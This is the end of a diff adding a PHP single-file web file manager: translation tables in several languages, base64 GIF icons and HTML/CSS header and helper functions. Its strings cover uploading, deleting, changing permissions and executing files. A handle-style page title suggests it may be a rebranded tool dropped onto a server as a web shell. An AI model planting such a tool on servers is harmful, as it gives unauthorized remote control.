+1850 'relative' => 'Relatief pat naar doel',
+1851 
+1852 'yes' => 'Ja',
+1853 'no' => 'Nee',
+1854 'back' => 'terug',
+1855 'destination' => 'Bestemming',
+1856 'symlink' => 'Symlink',
+1857 'no_output' => 'geen output',
+1858 
+1859 'user' => 'Gebruiker',
+1860 'password' => 'Wachtwoord',
+1861 'add' => 'toevoegen',
+1862 'add_basic_auth' => 'add basic-authentification',
+1863 
+1864 'uploaded' => '"[%1]" is verstuurd.',
+1865 'not_uploaded' => '"[%1]" kan niet worden verstuurd.',
+1866 'already_exists' => '"[%1]" bestaat al.',
+1867 'created' => '"[%1]" is aangemaakt.',
+1868 'not_created' => '"[%1]" kan niet worden aangemaakt.',
+1869 'really_delete' => 'Deze bestanden verwijderen?',
+1870 'deleted' => "Deze bestanden zijn verwijderd:\n[%1]",
+1871 'not_deleted' => "Deze bestanden konden niet worden verwijderd:\n[%1]",
+1872 'rename_file' => 'Bestandsnaam veranderen:',
+1873 'renamed' => '"[%1]" heet nu "[%2]".',
+1874 'not_renamed' => '"[%1] kon niet worden veranderd in "[%2]".',
+1875 'move_files' => 'Verplaats deze bestanden:',
+1876 'moved' => "Deze bestanden zijn verplaatst naar \"[%2]\":\n[%1]",
+1877 'not_moved' => "Kan deze bestanden niet verplaatsen naar \"[%2]\":\n[%1]",
+1878 'copy_files' => 'Kopieer deze bestanden:',
+1879 'copied' => "Deze bestanden zijn gekopieerd naar \"[%2]\":\n[%1]",
+1880 'not_copied' => "Deze bestanden kunnen niet worden gekopieerd naar \"[%2]\":\n[%1]",
+1881 'not_edited' => '"[%1]" kan niet worden bewerkt.',
+1882 'executed' => "\"[%1]\" is met succes uitgevoerd:\n{\%2}",
+1883 'not_executed' => "\"[%1]\" is niet goed uitgevoerd:\n{\%2}",
+1884 'saved' => '"[%1]" is opgeslagen.',
+1885 'not_saved' => '"[%1]" is niet opgeslagen.',
+1886 'symlinked' => 'Symlink van "[%2]" naar "[%1]" is aangemaakt.',
+1887 'not_symlinked' => 'Symlink van "[%2]" naar "[%1]" is niet aangemaakt.',
+1888 'permission_for' => 'Bevoegdheid voor "[%1]":',
+1889 'permission_set' => 'Bevoegdheid van "[%1]" is ingesteld op [%2].',
+1890 'permission_not_set' => 'Bevoegdheid van "[%1]" is niet ingesteld op [%2].',
+1891 'not_readable' => '"[%1]" kan niet worden gelezen.'
+1892        );
+1893 
+1894    case 'se':
+1895 
+1896        $date_format = 'n/j/y H:i:s';
+1897        $word_charset = 'ISO-8859-1';
+1898  
+1899        return array(
+1900 'directory' => 'Mapp',
+1901 'file' => 'Fil',
+1902 'filename' => 'Filnamn',
+1903  
+1904 'size' => 'Storlek',
+1905 'permission' => 'S�kerhetsniv�',
+1906 'owner' => '�gare',
+1907 'group' => 'Grupp',
+1908 'other' => 'Andra',
+1909 'functions' => 'Funktioner',
+1910  
+1911 'read' => 'L�s',
+1912 'write' => 'Skriv',
+1913 'execute' => 'Utf�r',
+1914  
+1915 'create_symlink' => 'Skapa symlink',
+1916 'delete' => 'Radera',
+1917 'rename' => 'Byt namn',
+1918 'move' => 'Flytta',
+1919 'copy' => 'Kopiera',
+1920 'edit' => '�ndra',
+1921 'download' => 'Ladda ner',
+1922 'upload' => 'Ladda upp',
+1923 'create' => 'Skapa',
+1924 'change' => '�ndra',
+1925 'save' => 'Spara',
+1926 'set' => 'Markera',
+1927 'reset' => 'T�m',
+1928 'relative' => 'Relative path to target',
+1929  
+1930 'yes' => 'Ja',
+1931 'no' => 'Nej',
+1932 'back' => 'Tillbaks',
+1933 'destination' => 'Destination',
+1934 'symlink' => 'Symlink',
+1935 'no_output' => 'no output',
+1936  
+1937 'user' => 'Anv�ndare',
+1938 'password' => 'L�senord',
+1939 'add' => 'L�gg till',
+1940 'add_basic_auth' => 'add basic-authentification',
+1941  
+1942 'uploaded' => '"[%1]" har laddats upp.',
+1943 'not_uploaded' => '"[%1]" kunde inte laddas upp.',
+1944 'already_exists' => '"[%1]" finns redan.',
+1945 'created' => '"[%1]" har skapats.',
+1946 'not_created' => '"[%1]" kunde inte skapas.',
+1947 'really_delete' => 'Radera dessa filer?',
+1948 'deleted' => "De h�r filerna har raderats:\n[%1]",
+1949 'not_deleted' => "Dessa filer kunde inte raderas:\n[%1]",
+1950 'rename_file' => 'Byt namn p� fil:',
+1951 'renamed' => '"[%1]" har bytt namn till "[%2]".',
+1952 'not_renamed' => '"[%1] kunde inte d�pas om till "[%2]".',
+1953 'move_files' => 'Flytta dessa filer:',
+1954 'moved' => "Dessa filer har flyttats till \"[%2]\":\n[%1]",
+1955 'not_moved' => "Dessa filer kunde inte flyttas till \"[%2]\":\n[%1]",
+1956 'copy_files' => 'Kopiera dessa filer:',
+1957 'copied' => "Dessa filer har kopierats till \"[%2]\":\n[%1]",
+1958 'not_copied' => "Dessa filer kunde inte kopieras till \"[%2]\":\n[%1]",
+1959 'not_edited' => '"[%1]" kan inte �ndras.',
+1960 'executed' => "\"[%1]\" har utf�rts:\n{\%2}",
+1961 'not_executed' => "\"[%1]\" kunde inte utf�ras:\n{\%2}",
+1962 'saved' => '"[%1]" har sparats.',
+1963 'not_saved' => '"[%1]" kunde inte sparas.',
+1964 'symlinked' => 'Symlink fr�n "[%2]" till "[%1]" har skapats.',
+1965 'not_symlinked' => 'Symlink fr�n "[%2]" till "[%1]" kunde inte skapas.',
+1966 'permission_for' => 'R�ttigheter f�r "[%1]":',
+1967 'permission_set' => 'R�ttigheter f�r "[%1]" �ndrades till [%2].',
+1968 'permission_not_set' => 'Permission of "[%1]" could not be set to [%2].',
+1969 'not_readable' => '"[%1]" kan inte l�sas.'
+1970        );
+1971 
+1972    case 'sp':
+1973 
+1974        $date_format = 'j/n/y H:i:s';
+1975        $word_charset = 'ISO-8859-1';
+1976 
+1977        return array(
+1978 'directory' => 'Directorio',
+1979 'file' => 'Archivo',
+1980 'filename' => 'Nombre Archivo',
+1981 
+1982 'size' => 'Tama�o',
+1983 'permission' => 'Permisos',
+1984 'owner' => 'Propietario',
+1985 'group' => 'Grupo',
+1986 'other' => 'Otros',
+1987 'functions' => 'Funciones',
+1988 
+1989 'read' => 'lectura',
+1990 'write' => 'escritura',
+1991 'execute' => 'ejecuci�n',
+1992 
+1993 'create_symlink' => 'crear enlace',
+1994 'delete' => 'borrar',
+1995 'rename' => 'renombrar',
+1996 'move' => 'mover',
+1997 'copy' => 'copiar',
+1998 'edit' => 'editar',
+1999 'download' => 'bajar',
+2000 'upload' => 'subir',
+2001 'create' => 'crear',
+2002 'change' => 'cambiar',
+2003 'save' => 'salvar',
+2004 'set' => 'setear',
+2005 'reset' => 'resetear',
+2006 'relative' => 'Path relativo',
+2007 
+2008 'yes' => 'Si',
+2009 'no' => 'No',
+2010 'back' => 'atr�s',
+2011 'destination' => 'Destino',
+2012 'symlink' => 'Enlace',
+2013 'no_output' => 'sin salida',
+2014 
+2015 'user' => 'Usuario',
+2016 'password' => 'Clave',
+2017 'add' => 'agregar',
+2018 'add_basic_auth' => 'agregar autentificaci�n b�sica',
+2019 
+2020 'uploaded' => '"[%1]" ha sido subido.',
+2021 'not_uploaded' => '"[%1]" no pudo ser subido.',
+2022 'already_exists' => '"[%1]" ya existe.',
+2023 'created' => '"[%1]" ha sido creado.',
+2024 'not_created' => '"[%1]" no pudo ser creado.',
+2025 'really_delete' => '�Borra estos archivos?',
+2026 'deleted' => "Estos archivos han sido borrados:\n[%1]",
+2027 'not_deleted' => "Estos archivos no pudieron ser borrados:\n[%1]",
+2028 'rename_file' => 'Renombra archivo:',
+2029 'renamed' => '"[%1]" ha sido renombrado a "[%2]".',
+2030 'not_renamed' => '"[%1] no pudo ser renombrado a "[%2]".',
+2031 'move_files' => 'Mover estos archivos:',
+2032 'moved' => "Estos archivos han sido movidos a \"[%2]\":\n[%1]",
+2033 'not_moved' => "Estos archivos no pudieron ser movidos a \"[%2]\":\n[%1]",
+2034 'copy_files' => 'Copiar estos archivos:',
+2035 'copied' => "Estos archivos han sido copiados a  \"[%2]\":\n[%1]",
+2036 'not_copied' => "Estos archivos no pudieron ser copiados \"[%2]\":\n[%1]",
+2037 'not_edited' => '"[%1]" no pudo ser editado.',
+2038 'executed' => "\"[%1]\" ha sido ejecutado correctamente:\n{\%2}",
+2039 'not_executed' => "\"[%1]\" no pudo ser ejecutado correctamente:\n{\%2}",
+2040 'saved' => '"[%1]" ha sido salvado.',
+2041 'not_saved' => '"[%1]" no pudo ser salvado.',
+2042 'symlinked' => 'Enlace desde "[%2]" a "[%1]" ha sido creado.',
+2043 'not_symlinked' => 'Enlace desde "[%2]" a "[%1]" no pudo ser creado.',
+2044 'permission_for' => 'Permisos de "[%1]":',
+2045 'permission_set' => 'Permisos de "[%1]" fueron seteados a [%2].',
+2046 'permission_not_set' => 'Permisos de "[%1]" no pudo ser seteado a [%2].',
+2047 'not_readable' => '"[%1]" no pudo ser le�do.'
+2048        );
+2049 
+2050    case 'dk':
+2051 
+2052        $date_format = 'n/j/y H:i:s';
+2053        $word_charset = 'ISO-8859-1';
+2054 
+2055        return array(
+2056 'directory' => 'Mappe',
+2057 'file' => 'Fil',
+2058 'filename' => 'Filnavn',
+2059 
+2060 'size' => 'St�rrelse',
+2061 'permission' => 'Rettighed',
+2062 'owner' => 'Ejer',
+2063 'group' => 'Gruppe',
+2064 'other' => 'Andre',
+2065 'functions' => 'Funktioner',
+2066 
+2067 'read' => 'l�s',
+2068 'write' => 'skriv',
+2069 'execute' => 'k�r',
+2070 
+2071 'create_symlink' => 'opret symbolsk link',
+2072 'delete' => 'slet',
+2073 'rename' => 'omd�b',
+2074 'move' => 'flyt',
+2075 'copy' => 'kopier',
+2076 'edit' => 'rediger',
+2077 'download' => 'download',
+2078 'upload' => 'upload',
+2079 'create' => 'opret',
+2080 'change' => 'skift',
+2081 'save' => 'gem',
+2082 'set' => 's�t',
+2083 'reset' => 'nulstil',
+2084 'relative' => 'Relativ sti til valg',
+2085 
+2086 'yes' => 'Ja',
+2087 'no' => 'Nej',
+2088 'back' => 'tilbage',
+2089 'destination' => 'Distination',
+2090 'symlink' => 'Symbolsk link',
+2091 'no_output' => 'ingen resultat',
+2092 
+2093 'user' => 'Bruger',
+2094 'password' => 'Kodeord',
+2095 'add' => 'tilf�j',
+2096 'add_basic_auth' => 'tilf�j grundliggende rettigheder',
+2097 
+2098 'uploaded' => '"[%1]" er blevet uploaded.',
+2099 'not_uploaded' => '"[%1]" kunnu ikke uploades.',
+2100 'already_exists' => '"[%1]" findes allerede.',
+2101 'created' => '"[%1]" er blevet oprettet.',
+2102 'not_created' => '"[%1]" kunne ikke oprettes.',
+2103 'really_delete' => 'Slet disse filer?',
+2104 'deleted' => "Disse filer er blevet slettet:\n[%1]",
+2105 'not_deleted' => "Disse filer kunne ikke slettes:\n[%1]",
+2106 'rename_file' => 'Omd�d fil:',
+2107 'renamed' => '"[%1]" er blevet omd�bt til "[%2]".',
+2108 'not_renamed' => '"[%1] kunne ikke omd�bes til "[%2]".',
+2109 'move_files' => 'Flyt disse filer:',
+2110 'moved' => "Disse filer er blevet flyttet til \"[%2]\":\n[%1]",
+2111 'not_moved' => "Disse filer kunne ikke flyttes til \"[%2]\":\n[%1]",
+2112 'copy_files' => 'Kopier disse filer:',
+2113 'copied' => "Disse filer er kopieret til \"[%2]\":\n[%1]",
+2114 'not_copied' => "Disse filer kunne ikke kopieres til \"[%2]\":\n[%1]",
+2115 'not_edited' => '"[%1]" kan ikke redigeres.',
+2116 'executed' => "\"[%1]\" er blevet k�rt korrekt:\n{\%2}",
+2117 'not_executed' => "\"[%1]\" kan ikke k�res korrekt:\n{\%2}",
+2118 'saved' => '"[%1]" er blevet gemt.',
+2119 'not_saved' => '"[%1]" kunne ikke gemmes.',
+2120 'symlinked' => 'Symbolsk link fra "[%2]" til "[%1]" er blevet oprettet.',
+2121 'not_symlinked' => 'Symbolsk link fra "[%2]" til "[%1]" kunne ikke oprettes.',
+2122 'permission_for' => 'Rettigheder for "[%1]":',
+2123 'permission_set' => 'Rettigheder for "[%1]" blev sat til [%2].',
+2124 'permission_not_set' => 'Rettigheder for "[%1]" kunne ikke s�ttes til [%2].',
+2125 'not_readable' => '"[%1]" Kan ikke l�ses.'
+2126        );
+2127 
+2128    case 'tr':
+2129 
+2130        $date_format = 'n/j/y H:i:s';
+2131        $word_charset = 'ISO-8859-1';
+2132 
+2133        return array(
+2134 'directory' => 'Klas�r',
+2135 'file' => 'Dosya',
+2136 'filename' => 'dosya adi',
+2137 
+2138 'size' => 'boyutu',
+2139 'permission' => 'Izin',
+2140 'owner' => 'sahib',
+2141 'group' => 'Grup',
+2142 'other' => 'Digerleri',
+2143 'functions' => 'Fonksiyonlar',
+2144 
+2145 'read' => 'oku',
+2146 'write' => 'yaz',
+2147 'execute' => '�alistir',
+2148 
+2149 'create_symlink' => 'yarat symlink',
+2150 'delete' => 'sil',
+2151 'rename' => 'ad degistir',
+2152 'move' => 'tasi',
+2153 'copy' => 'kopyala',
+2154 'edit' => 'd�zenle',
+2155 'download' => 'indir',
+2156 'upload' => 'y�kle',
+2157 'create' => 'create',
+2158 'change' => 'degistir',
+2159 'save' => 'kaydet',
+2160 'set' => 'ayar',
+2161 'reset' => 'sifirla',
+2162 'relative' => 'Hedef yola g�re',
+2163 
+2164 'yes' => 'Evet',
+2165 'no' => 'Hayir',
+2166 'back' => 'Geri',
+2167 'destination' => 'Hedef',
+2168 'symlink' => 'K�sa yol',
+2169 'no_output' => '�ikti yok',
+2170 
+2171 'user' => 'Kullanici',
+2172 'password' => 'Sifre',
+2173 'add' => 'ekle',
+2174 'add_basic_auth' => 'ekle basit-authentification',
+2175 
+2176 'uploaded' => '"[%1]" y�klendi.',
+2177 'not_uploaded' => '"[%1]" y�klenemedi.',
+2178 'already_exists' => '"[%1]" kullanilmakta.',
+2179 'created' => '"[%1]" olusturuldu.',
+2180 'not_created' => '"[%1]" olusturulamadi.',
+2181 'really_delete' => 'Bu dosyalari silmek istediginizden eminmisiniz?',
+2182 'deleted' => "Bu dosyalar silindi:\n[%1]",
+2183 'not_deleted' => "Bu dosyalar silinemedi:\n[%1]",
+2184 'rename_file' => 'Adi degisen dosya:',
+2185 'renamed' => '"[%1]" adili dosyanin yeni adi "[%2]".',
+2186 'not_renamed' => '"[%1] adi degistirilemedi "[%2]" ile.',
+2187 'move_files' => 'Tasinan dosyalar:',
+2188 'moved' => "Bu dosyalari tasidiginiz yer \"[%2]\":\n[%1]",
+2189 'not_moved' => "Bu dosyalari tasiyamadiginiz yer \"[%2]\":\n[%1]",
+2190 'copy_files' => 'Kopyalanan dosyalar:',
+2191 'copied' => "Bu dosyalar kopyalandi \"[%2]\":\n[%1]",
+2192 'not_copied' => "Bu dosyalar kopyalanamiyor \"[%2]\":\n[%1]",
+2193 'not_edited' => '"[%1]" d�zenlenemiyor.',
+2194 'executed' => "\"[%1]\" basariyla �alistirildi:\n{\%2}",
+2195 'not_executed' => "\"[%1]\" �alistirilamadi:\n{\%2}",
+2196 'saved' => '"[%1]" kaydedildi.',
+2197 'not_saved' => '"[%1]" kaydedilemedi.',
+2198 'symlinked' => '"[%2]" den "[%1]" e k�sayol olu�turuldu.',
+2199 'not_symlinked' => '"[%2]"den "[%1]" e k�sayol olu�turulamad�.',
+2200 'permission_for' => 'Izinler "[%1]":',
+2201 'permission_set' => 'Izinler "[%1]" degistirildi [%2].',
+2202 'permission_not_set' => 'Izinler "[%1]" degistirilemedi [%2].',
+2203 'not_readable' => '"[%1]" okunamiyor.'
+2204        );
+2205 
+2206    case 'cs':
+2207 
+2208        $date_format = 'd.m.y H:i:s';
+2209        $word_charset = 'UTF-8';
+2210 
+2211        return array(
+2212 'directory' => 'Adresář',
+2213 'file' => 'Soubor',
+2214 'filename' => 'Jméno souboru',
+2215 
+2216 'size' => 'Velikost',
+2217 'permission' => 'Práva',
+2218 'owner' => 'Vlastník',
+2219 'group' => 'Skupina',
+2220 'other' => 'Ostatní',
+2221 'functions' => 'Funkce',
+2222 
+2223 'read' => 'Čtení',
+2224 'write' => 'Zápis',
+2225 'execute' => 'Spouštění',
+2226 
+2227 'create_symlink' => 'Vytvořit symbolický odkaz',
+2228 'delete' => 'Smazat',
+2229 'rename' => 'Přejmenovat',
+2230 'move' => 'Přesunout',
+2231 'copy' => 'Zkopírovat',
+2232 'edit' => 'Otevřít',
+2233 'download' => 'Stáhnout',
+2234 'upload' => 'Nahraj na server',
+2235 'create' => 'Vytvořit',
+2236 'change' => 'Změnit',
+2237 'save' => 'Uložit',
+2238 'set' => 'Nastavit',
+2239 'reset' => 'zpět',
+2240 'relative' => 'Relatif',
+2241 
+2242 'yes' => 'Ano',
+2243 'no' => 'Ne',
+2244 'back' => 'Zpět',
+2245 'destination' => 'Destination',
+2246 'symlink' => 'Symbolický odkaz',
+2247 'no_output' => 'Prázdný výstup',
+2248 
+2249 'user' => 'Uživatel',
+2250 'password' => 'Heslo',
+2251 'add' => 'Přidat',
+2252 'add_basic_auth' => 'přidej základní autentizaci',
+2253 
+2254 'uploaded' => 'Soubor "[%1]" byl nahrán na server.',
+2255 'not_uploaded' => 'Soubor "[%1]" nebyl nahrán na server.',
+2256 'already_exists' => 'Soubor "[%1]" už exituje.',
+2257 'created' => 'Soubor "[%1]" byl vytvořen.',
+2258 'not_created' => 'Soubor "[%1]" nemohl být  vytvořen.',
+2259 'really_delete' => 'Vymazat soubor?',
+2260 'deleted' => "Byly vymazány tyto soubory:\n[%1]",
+2261 'not_deleted' => "Tyto soubory nemohly být vytvořeny:\n[%1]",
+2262 'rename_file' => 'Přejmenuj soubory:',
+2263 'renamed' => 'Soubor "[%1]" byl přejmenován na "[%2]".',
+2264 'not_renamed' => 'Soubor "[%1]" nemohl být přejmenován na "[%2]".',
+2265 'move_files' => 'Přemístit tyto soubory:',
+2266 'moved' => "Tyto soubory byly přemístěny do \"[%2]\":\n[%1]",
+2267 'not_moved' => "Tyto soubory nemohly být přemístěny do \"[%2]\":\n[%1]",
+2268 'copy_files' => 'Zkopírovat tyto soubory:',
+2269 'copied' => "Tyto soubory byly zkopírovány do \"[%2]\":\n[%1]",
+2270 'not_copied' => "Tyto soubory nemohly být zkopírovány do \"[%2]\":\n[%1]",
+2271 'not_edited' => 'Soubor "[%1]" nemohl být otevřen.',
+2272 'executed' => "SOubor \"[%1]\" byl spuštěn :\n{\%2}",
+2273 'not_executed' => "Soubor \"[%1]\" nemohl být spuštěn:\n{\%2}",
+2274 'saved' => 'Soubor "[%1]" byl uložen.',
+2275 'not_saved' => 'Soubor "[%1]" nemohl být uložen.',
+2276 'symlinked' => 'Byl vyvořen symbolický odkaz "[%2]" na soubor "[%1]".',
+2277 'not_symlinked' => 'Symbolický odkaz "[%2]" na soubor "[%1]" nemohl být vytvořen.',
+2278 'permission_for' => 'Práva k "[%1]":',
+2279 'permission_set' => 'Práva k "[%1]" byla změněna na [%2].',
+2280 'permission_not_set' => 'Práva k "[%1]" nemohla být změněna na [%2].',
+2281 'not_readable' => 'Soubor "[%1]" není možno přečíst.'
+2282        );
+2283 
+2284    case 'en':
+2285    default:
+2286 
+2287        $date_format = 'n/j/y H:i:s';
+2288        $word_charset = 'ISO-8859-1';
+2289 
+2290        return array(
+2291 'directory' => 'Directory',
+2292 'file' => 'File',
+2293 'filename' => 'Filename',
+2294 
+2295 'size' => 'Size',
+2296 'permission' => 'Permission',
+2297 'owner' => 'Owner',
+2298 'group' => 'Group',
+2299 'other' => 'Others',
+2300 'functions' => 'Functions',
+2301 
+2302 'read' => 'read',
+2303 'write' => 'write',
+2304 'execute' => 'execute',
+2305 
+2306 'create_symlink' => 'create symlink',
+2307 'delete' => 'delete',
+2308 'rename' => 'rename',
+2309 'move' => 'move',
+2310 'copy' => 'copy',
+2311 'edit' => 'edit',
+2312 'download' => 'download',
+2313 'upload' => 'upload',
+2314 'create' => 'create',
+2315 'change' => 'change',
+2316 'save' => 'save',
+2317 'set' => 'set',
+2318 'reset' => 'reset',
+2319 'relative' => 'Relative path to target',
+2320 
+2321 'yes' => 'Yes',
+2322 'no' => 'No',
+2323 'back' => 'back',
+2324 'destination' => 'Destination',
+2325 'symlink' => 'Symlink',
+2326 'no_output' => 'no output',
+2327 
+2328 'user' => 'User',
+2329 'password' => 'Password',
+2330 'add' => 'add',
+2331 'add_basic_auth' => 'add basic-authentification',
+2332 
+2333 'uploaded' => '"[%1]" has been uploaded.',
+2334 'not_uploaded' => '"[%1]" could not be uploaded.',
+2335 'already_exists' => '"[%1]" already exists.',
+2336 'created' => '"[%1]" has been created.',
+2337 'not_created' => '"[%1]" could not be created.',
+2338 'really_delete' => 'Delete these files?',
+2339 'deleted' => "These files have been deleted:\n[%1]",
+2340 'not_deleted' => "These files could not be deleted:\n[%1]",
+2341 'rename_file' => 'Rename file:',
+2342 'renamed' => '"[%1]" has been renamed to "[%2]".',
+2343 'not_renamed' => '"[%1] could not be renamed to "[%2]".',
+2344 'move_files' => 'Move these files:',
+2345 'moved' => "These files have been moved to \"[%2]\":\n[%1]",
+2346 'not_moved' => "These files could not be moved to \"[%2]\":\n[%1]",
+2347 'copy_files' => 'Copy these files:',
+2348 'copied' => "These files have been copied to \"[%2]\":\n[%1]",
+2349 'not_copied' => "These files could not be copied to \"[%2]\":\n[%1]",
+2350 'not_edited' => '"[%1]" can not be edited.',
+2351 'executed' => "\"[%1]\" has been executed successfully:\n{\%2}",
+2352 'not_executed' => "\"[%1]\" could not be executed successfully:\n{\%2}",
+2353 'saved' => '"[%1]" has been saved.',
+2354 'not_saved' => '"[%1]" could not be saved.',
+2355 'symlinked' => 'Symlink from "[%2]" to "[%1]" has been created.',
+2356 'not_symlinked' => 'Symlink from "[%2]" to "[%1]" could not be created.',
+2357 'permission_for' => 'Permission of "[%1]":',
+2358 'permission_set' => 'Permission of "[%1]" was set to [%2].',
+2359 'permission_not_set' => 'Permission of "[%1]" could not be set to [%2].',
+2360 'not_readable' => '"[%1]" can not be read.'
+2361        );
+2362 
+2363    }
+2364 
+2365 }
+2366 
+2367 function getimage ($image) {
+2368    switch ($image) {
+2369    case 'file':
+2370        return base64_decode('R0lGODlhEQANAJEDAJmZmf///wAAAP///yH5BAHoAwMALAAAAAARAA0AAAItnIGJxg0B42rsiSvCA/REmXQWhmnih3LUSGaqg35vFbSXucbSabunjnMohq8CADsA');
+2371    case 'folder':
+2372        return base64_decode('R0lGODlhEQANAJEDAJmZmf///8zMzP///yH5BAHoAwMALAAAAAARAA0AAAIqnI+ZwKwbYgTPtIudlbwLOgCBQJYmCYrn+m3smY5vGc+0a7dhjh7ZbygAADsA');
+2373    case 'hidden_file':
+2374        return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAAItnIGJxg0B42rsiSvCA/REmXQWhmnih3LUSGaqg35vFbSXucbSabunjnMohq8CADsA');
+2375    case 'link':
+2376        return base64_decode('R0lGODlhEQANAKIEAJmZmf///wAAAMwAAP///wAAAAAAAAAAACH5BAHoAwQALAAAAAARAA0AAAM5SArcrDCCQOuLcIotwgTYUllNOA0DxXkmhY4shM5zsMUKTY8gNgUvW6cnAaZgxMyIM2zBLCaHlJgAADsA');
+2377    case 'smiley':
+2378        return base64_decode('R0lGODlhEQANAJECAAAAAP//AP///wAAACH5BAHoAwIALAAAAAARAA0AAAIslI+pAu2wDAiz0jWD3hqmBzZf1VCleJQch0rkdnppB3dKZuIygrMRE/oJDwUAOwA=');
+2379    case 'arrow':
+2380        return base64_decode('R0lGODlhEQANAIABAAAAAP///yH5BAEKAAEALAAAAAARAA0AAAIdjA9wy6gNQ4pwUmav0yvn+hhJiI3mCJ6otrIkxxQAOw==');
+2381    }
+2382 }
+2383 
+2384 function html_header () {
+2385    global $site_charset;
+2386 
+2387    echo <<<END
+2388 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+2389      "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+2390 <html xmlns="http://www.w3.org/1999/xhtml">
+2391 <head>
+2392 
+2393 <meta http-equiv="Content-Type" content="text/html; charset=$site_charset" />
+2394 
+2395 <title>..::: Ali Afee :::..</title>
+2396 
+2397 <style type="text/css">
+2398 body { font: small sans-serif; text-align: center }
+2399 img { width: 17px; height: 13px }
+2400 a, a:visited { text-decoration: none; color: navy }
+2401 hr { border-style: none; height: 1px; background-color: silver; color: silver }
+2402 #main { margin-top: 6pt; margin-left: auto; margin-right: auto; border-spacing: 1px }
+2403 #main th { background: #eee; padding: 3pt 3pt 0pt 3pt }
+2404 .listing th, .listing td { padding: 1px 3pt 0 3pt }
+2405 .listing th { border: 1px solid silver }
+2406 .listing td { border: 1px solid #ddd; background: white }
+2407 .listing .checkbox { text-align: center }
+2408 .listing .filename { text-align: left }
+2409 .listing .size { text-align: right }
+2410 .listing .permission_header { text-align: left }
+2411 .listing .permission { font-family: monospace }
+2412 .listing .owner { text-align: left }
+2413 .listing .group { text-align: left }
+2414 .listing .functions { text-align: left }
+2415 .listing_footer td { background: #eee; border: 1px solid silver }
+2416 #directory, #upload, #create, .listing_footer td, #error td, #notice td { text-align: left; padding: 3pt }
+2417 #directory { background: #eee; border: 1px solid silver }
+2418 #upload { padding-top: 1em }
+2419 #create { padding-bottom: 1em }
+2420 .small, .small option { font-size: x-small }
+2421 textarea { border: none; background: white }
+2422 table.dialog { margin-left: auto; margin-right: auto }
+2423 td.dialog { background: #eee; padding: 1ex; border: 1px solid silver; text-align: center }
+2424 #permission { margin-left: auto; margin-right: auto }
+2425 #permission td { padding-left: 3pt; padding-right: 3pt; text-align: center }
+2426 td.permission_action { text-align: right }
+2427 #symlink { background: #eee; border: 1px solid silver }
+2428 #symlink td { text-align: left; padding: 3pt }
+2429 #red_button { width: 120px; color: #400 }
+2430 #green_button { width: 120px; color: #040 }
+2431 #error td { background: maroon; color: white; border: 1px solid silver }
+2432 #notice td { background: green; color: white; border: 1px solid silver }
+2433 #notice pre, #error pre { background: silver; color: black; padding: 1ex; margin-left: 1ex; margin-right: 1ex }
+2434 code { font-size: 12pt }
+2435 td { white-space: nowrap }
+2436 </style>
+2437 
+2438 <script type="text/javascript">
+2439 <!--
+2440 function activate (name) {
+2441    if (document && document.forms[0] && document.forms[0].elements['focus']) {
+2442        document.forms[0].elements['focus'].value = name;
+2443    }
+2444 }
+2445 //-->
+2446 </script>
+2447 
+2448 </head>
+2449 <body>
+2450 
+2451 
+2452 END;
+2453 
+2454 }
+2455 
+2456 function html_footer () {
+2457 
+2458    echo <<<END
+2459 </body>
+2460 </html>
+2461 END;
+2462 
+2463 }
+2464 
+2465 function notice ($phrase) {
+2466    global $cols;
+2467 
+2468    $args = func_get_args();
+2469    array_shift($args);
+2470 
+2471    return '<tr id="notice">
+2472   <td colspan="' . $cols . '">' . phrase($phrase, $args) . '</td>
+2473 </tr>
+2474 ';
+2475 
+2476 }
+2477 
+2478 function error ($phrase) {
+2479    global $cols;
+2480 
+2481    $args = func_get_args();
+2482    array_shift($args);
+2483 
+2484    return '<tr id="error">
+2485   <td colspan="' . $cols . '">' . phrase($phrase, $args) . '</td>
+2486 </tr>
+2487 ';
+2488 
+2489 }
+2490 
+2491 ?>
